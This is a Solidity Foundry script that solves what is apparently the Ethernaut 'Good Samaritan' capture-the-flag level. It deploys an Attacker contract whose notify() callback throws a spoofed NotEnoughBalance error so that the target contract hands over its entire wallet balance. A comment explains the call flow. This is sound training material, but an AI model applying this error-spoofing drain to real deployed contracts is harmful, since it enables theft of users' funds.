// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GoodSamaritan, Coin, Wallet} from "../src/GoodSamaritan.sol";
import "openzeppelin-contracts-08/contracts/utils/Address.sol";


contract Attacker {
    GoodSamaritan private samaritan;
    Coin private coin;

    error NotEnoughBalance();

    constructor(address _target, address _coin) {
        samaritan = GoodSamaritan(_target);
        coin = Coin(_coin);
    }

    function drain() external {
        samaritan.requestDonation();
    }

    function notify(uint256 _amount) external {
        if (coin.balances(address(this)) == 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritanScript is Script {

    /**
     * Solution: To throw a custom error NotEnoughBalance in the notify method
     * The flow is
     * 
     * GoodSamaritan.requestDonation() -> Wallet.donate10() -> Coin.transfer() -> Attacker.notify()
     * 
     * 1. Donate 10 tokens to attacker
     * 2. Enters notify() method 
     * 3. notify() -> Checks if attacker's balance is equal to 10 because if we don't do this check it will be an
     * inifinite loop and at some point it will revert with InsufficientBalance
     */
    function run() public {
        GoodSamaritan samaritan = GoodSamaritan(0xA62Fdb09ae65A6EcF22bEf439E4803DCe2574A10);
        Coin coin = Coin(address(samaritan.coin()));
        Wallet wallet = Wallet(address(samaritan.wallet()));

        Attacker attacker = new Attacker(address(samaritan), address(coin));
        attacker.drain();

        console.log("wallet balances", coin.balances(address(wallet)));
        console.log("attacker balances", coin.balances(address(attacker)));
    }
}